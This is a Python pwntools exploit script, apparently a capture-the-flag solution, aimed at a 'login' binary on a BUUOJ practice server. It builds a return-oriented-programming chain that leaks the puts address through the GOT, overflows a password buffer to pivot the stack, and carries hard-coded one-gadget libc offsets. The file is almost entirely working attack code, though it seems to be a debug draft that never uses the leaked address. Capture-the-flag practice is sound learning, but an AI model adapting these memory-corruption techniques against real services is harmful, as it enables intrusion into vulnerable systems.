#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/26 09:06:36
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process(['./login'],env={'LD_PRELOAD':'./libc.so.6'})
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node3.buuoj.cn'
    port = 29594
    sh = remote(IP,port)
    libc = ELF('./libc.so.6')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('login')
main_addr = 0x401A2A
pop_rdi_ret = 0x401ab3
s1_addr = 0x602400
s1 = p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main_addr)
buf =  '\xA7\xA5Wz)/#!' + p64(0) + '\xC3\x1F\x80J\x0EJ\x89C'  + 'aaaaaaaa' 
buf = buf.ljust(0x20,"\x00")
buf += p64(s1_addr)
sh.recvuntil("Please Sign-in")
sh.send(s1)
sh.recvuntil("Please input u Pass")
gdb.attach(sh)
pause()
sh.send(buf)
sh.interactive()

